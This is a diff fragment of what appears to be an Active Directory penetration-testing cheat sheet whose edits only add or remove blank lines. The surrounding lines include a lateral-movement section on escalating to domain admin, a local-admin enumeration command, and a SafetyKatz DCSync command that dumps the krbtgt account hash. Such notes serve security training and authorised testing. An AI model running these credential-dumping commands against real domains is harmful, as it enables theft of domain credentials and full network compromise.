@@ -27,6 +27,7 @@
  
   
 <div style="page-break-after: always;"></div>
+
 ## General
 Connect to a machine with Administrator privileges
 ```
@@ -474,6 +475,7 @@ Perform the enumeration
 Find-PSRemotingLocalAdminAccess
 ```
 <div style="page-break-after: always;"></div>
+
 ## Lateral Movement
 Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
 
@@ -600,8 +602,6 @@ Using SafetyKatz
 ```
 SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
 ```
-
-
 
 ### Derivative Local Admin to dump credentials
 Using winrs to connect on remote machine on which the user has local admin privileges
